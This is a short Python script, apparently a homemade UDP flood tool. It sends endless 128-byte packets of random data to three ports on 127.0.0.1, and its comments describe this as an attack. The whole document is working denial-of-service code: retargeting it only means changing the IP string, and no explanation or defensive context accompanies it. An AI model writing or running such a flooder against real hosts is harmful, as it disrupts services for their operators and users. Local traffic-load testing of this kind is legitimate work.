import socket 
import random

# Create a socket
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

# The IP we are attacking
ip = '127.0.0.1'

#Port we direct to attack
ports = [5011, 5111, 5211]

sent = 0
#Infinitely loops to send packets to the port until the program is exited
while 1:
    for i in range(len(ports)):
        # Create packet content
        data = random._urandom(128)

        # send packets to target ports
        sock.sendto(data,(ip,ports[i]))
        print ("sent packet",sent)
        sent = sent + 1